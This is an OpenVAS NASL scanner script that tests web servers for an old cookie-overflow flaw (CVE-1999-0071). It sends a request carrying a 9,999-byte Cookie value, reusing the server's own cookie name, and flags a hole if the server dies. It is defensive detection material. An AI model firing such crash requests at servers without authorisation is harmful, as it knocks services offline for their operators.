# OpenVAS Vulnerability Test
# $Id: www_too_long_cookie.nasl 17 2013-10-27 14:01:43Z jan $
# Description: HTTP Cookie overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the web server by
sending an invalid request with a too long Cookie name or value

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# Affected: Apache < 1.1

if(description)
{
 script_id(11077);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-1999-0071");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 name = "HTTP Cookie overflow";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Too big Cookie chokes the web server";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before OpenVAS
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

########



include ("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

# If the server sends us a cookie, we will reply with it... 
# Slightly modified :-)
r = http_get(item:"/", port: port);
send(socket:soc, data: r);
h = http_recv_headers2(socket:soc);
r = http_recv_body(socket: soc, headers:h);
close(soc);

ck = egrep(pattern: "^Set-Cookie: ", string: h);

ckn="OpenVAS";
if (ck)
{
  ckn = ereg_replace(string: ck, 
	pattern: "^Set-Cookie: +([^=;]+)=.*", 
	replace:"\1");
}

soc = http_open_socket(port);
if(!soc) exit(0);

r = http_get(item:"/", port: port);
r= r - string("\r\n\r\n");
r= string(r, "\r\n", "Cookie: ", ckn, "=", crap(9999), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port, retry:1)) { security_hole(port); exit(0); }